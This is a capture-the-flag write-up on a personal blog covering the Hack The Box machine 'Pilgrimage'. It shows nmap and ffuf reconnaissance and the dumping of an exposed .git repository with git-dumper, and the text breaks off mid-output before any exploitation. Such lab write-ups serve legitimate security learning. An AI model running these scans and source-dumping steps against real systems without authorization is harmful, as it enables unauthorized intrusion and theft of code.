<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>HTB Writeup - Pilgrimage (Easy) :: CyberSpider</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Writeup of Pilgrimage from Hack The Box." />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="/posts/pilgrimage/" />






  
  
  
  
  
  <link rel="stylesheet" href="/styles.css">



<link rel="stylesheet" href="/style.css">



  <link rel="shortcut icon" href="/img/theme-colors/green.png">
  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="CyberSpider" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="HTB Writeup - Pilgrimage (Easy)">
<meta property="og:description" content="Writeup of Pilgrimage from Hack The Box." />
<meta property="og:url" content="/posts/pilgrimage/" />
<meta property="og:site_name" content="CyberSpider" />

  
    <meta property="og:image" content="/img/favicon/green.png">
  

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2023-09-06 00:00:00 &#43;0000 UTC" />












</head>
<body class="green">


<div class="container full headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    cyberspider@ubuntu:~$
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;▾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/archive">archive</a></li>
        
      
        
          <li><a href="/whoami">whoami</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/archive" >archive</a></li>
        
      
        
          <li><a href="/whoami" >whoami</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="/posts/pilgrimage/">HTB Writeup - Pilgrimage (Easy)</a>
  </h1>
  <div class="post-meta"><time class="post-date">2023-09-06</time><span class="post-author">CyberSpider</span></div>

  
    <span class="post-tags">
      
      #<a href="/tags/htb/">htb</a>&nbsp;
      
      #<a href="/tags/easy/">easy</a>&nbsp;
      
      #<a href="/tags/linux/">linux</a>&nbsp;
      
      #<a href="/tags/lfi/">LFI</a>&nbsp;
      
    </span>
  
  


  

  <div class="post-content"><div>
        <p>The <code>Pilgrimage</code> machine is an easy linux box.</p>
<p><img src="/images/Pilgrimage.png#center" alt="Scenario 1: Across columns"></p>
<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>I do a <code>nmap scan</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nmap -sV -sC -A 10.10.11.219  
</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-09-06 09:34 EDT
</span></span><span style="display:flex;"><span>Stats: 0:00:05 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Connect Scan
</span></span><span style="display:flex;"><span>Connect Scan Timing: About 35.60% <span style="color:#66d9ef">done</span>; ETC: 09:35 <span style="color:#f92672">(</span>0:00:09 remaining<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> pilgrimage.htb <span style="color:#f92672">(</span>10.10.11.219<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.11s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0
</span></span><span style="display:flex;"><span>|_http-title: Pilgrimage - Shrink Your Images
</span></span><span style="display:flex;"><span>| http-cookie-flags: 
</span></span><span style="display:flex;"><span>|   /: 
</span></span><span style="display:flex;"><span>|     PHPSESSID: 
</span></span><span style="display:flex;"><span>|_      httponly flag not set
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
</span></span><span style="display:flex;"><span>| http-git: 
</span></span><span style="display:flex;"><span>|   10.10.11.219:80/.git/
</span></span><span style="display:flex;"><span>|     Git repository found!
</span></span><span style="display:flex;"><span>|     Repository description: Unnamed repository; edit this file <span style="color:#e6db74">&#39;description&#39;</span> to name the...
</span></span><span style="display:flex;"><span>|_    Last commit message: Pilgrimage image shrinking service initial commit. <span style="color:#75715e"># Please ...</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>I edit this file <code>/etc/hosts</code> in this way:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ sudo nano /etc/hosts                       
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ cat /etc/hosts
</span></span><span style="display:flex;"><span>127.0.0.1       localhost
</span></span><span style="display:flex;"><span>127.0.1.1       kali
</span></span><span style="display:flex;"><span>::1             localhost ip6-localhost ip6-loopback
</span></span><span style="display:flex;"><span>ff02::1         ip6-allnodes
</span></span><span style="display:flex;"><span>ff02::2         ip6-allrouters
</span></span><span style="display:flex;"><span>10.10.11.219    pilgrimage.htb
</span></span></code></pre></div><h2 id="http">HTTP<a href="#http" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>I find a <code>/register.php</code> , I register me, and then I do the login in the <code>/login.php</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>http://pilgrimage.htb/login.php
</span></span></code></pre></div><p>I do the directory enumeration with <code>ffuf</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt  -u  http://pilgrimage.htb/FUZZ
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#e6db74">&#39;___\       
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       /\ \__/ /\ \__/  __  __  /\ \__/       
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">         \ \_\   \ \_\  \ \____/  \ \_\       
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          \/_/    \/_/   \/___/    \/_/       
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       v2.0.0-dev
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">________________________________________________
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> :: Method           : GET
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> :: URL              : http://pilgrimage.htb/FUZZ
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> :: Follow redirects : false
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> :: Calibration      : false
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> :: Timeout          : 10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> :: Threads          : 40
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">________________________________________________
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 53ms]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    * FUZZ: .git
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 53ms]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    * FUZZ: .htpasswd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 61ms]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    * FUZZ: .htaccess
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 46ms]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    * FUZZ: assets
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 51ms]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    * FUZZ: tmp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 49ms]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    * FUZZ: vendor
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">:: Progress: [20476/20476] :: Job [1/1] :: 806 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">┌──(kali㉿kali)-[~]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://pilgrimage.htb/FUZZ  -recursion -recursion-depth 1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        /&#39;</span>___<span style="color:#ae81ff">\ </span> /<span style="color:#e6db74">&#39;___\           /&#39;</span>___<span style="color:#ae81ff">\ </span>      
</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       v2.0.0-dev
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> :: Method           : GET
</span></span><span style="display:flex;"><span> :: URL              : http://pilgrimage.htb/FUZZ
</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
</span></span><span style="display:flex;"><span> :: Follow redirects : false
</span></span><span style="display:flex;"><span> :: Calibration      : false
</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 113ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: .htaccess
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 117ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: .htpasswd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 124ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: .git
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Adding a new job to the queue: http://pilgrimage.htb/.git/FUZZ
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 117ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: assets
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Adding a new job to the queue: http://pilgrimage.htb/assets/FUZZ
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 115ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: tmp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Adding a new job to the queue: http://pilgrimage.htb/tmp/FUZZ
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 114ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: vendor
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Adding a new job to the queue: http://pilgrimage.htb/vendor/FUZZ
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Starting queued job on target: http://pilgrimage.htb/.git/FUZZ
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 116ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: .htaccess
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 116ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: .htpasswd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 120ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: branches
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARN<span style="color:#f92672">]</span> Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/.git/branches/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 200, Size: 92, Words: 9, Lines: 6, Duration: 115ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: config
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 200, Size: 73, Words: 10, Lines: 2, Duration: 114ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: description
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 114ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: hooks
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARN<span style="color:#f92672">]</span> Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/.git/hooks/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 200, Size: 3768, Words: 22, Lines: 16, Duration: 117ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: index
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 115ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: info
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARN<span style="color:#f92672">]</span> Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/.git/info/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 114ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: logs
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARN<span style="color:#f92672">]</span> Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/.git/logs/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 114ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: objects
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARN<span style="color:#f92672">]</span> Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/.git/objects/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 117ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: refs
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARN<span style="color:#f92672">]</span> Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/.git/refs/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Starting queued job on target: http://pilgrimage.htb/assets/FUZZ
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 118ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: .htpasswd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 119ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: .htaccess
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 117ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: css
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARN<span style="color:#f92672">]</span> Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/assets/css/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 117ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: images
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARN<span style="color:#f92672">]</span> Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/assets/images/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 122ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: js
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARN<span style="color:#f92672">]</span> Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/assets/js/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Starting queued job on target: http://pilgrimage.htb/tmp/FUZZ
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 125ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: .htaccess
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 125ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: .htpasswd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Starting queued job on target: http://pilgrimage.htb/vendor/FUZZ
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 119ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: .htpasswd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 119ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: .htaccess
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 115ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * FUZZ: jquery
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARN<span style="color:#f92672">]</span> Directory found, but recursion depth exceeded. Ignoring: http://pilgrimage.htb/vendor/jquery/
</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>20476/20476<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>5/5<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">330</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:01:00<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
</span></span></code></pre></div><p>We found <code>.git</code> directory on the website
After we found <code>.git</code> directory, we can dump the directory to get the source code using <code>https://github.com/arthaud/git-dumper</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/git-dumper<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ python3 git_dumper.py http://pilgrimage.htb/.git/ Pilgrimage
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Testing http://pilgrimage.htb/.git/HEAD <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Testing http://pilgrimage.htb/.git/ <span style="color:#f92672">[</span>403<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching common files
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.gitignore <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> http://pilgrimage.htb/.gitignore responded with status code <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/COMMIT_EDITMSG <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/hooks/applypatch-msg.sample <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/description <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/hooks/commit-msg.sample <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/hooks/pre-applypatch.sample <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/hooks/post-commit.sample <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> http://pilgrimage.htb/.git/hooks/post-commit.sample responded with status code <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/hooks/post-receive.sample <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> http://pilgrimage.htb/.git/hooks/post-receive.sample responded with status code <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/hooks/pre-commit.sample <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/hooks/post-update.sample <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/hooks/pre-rebase.sample <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
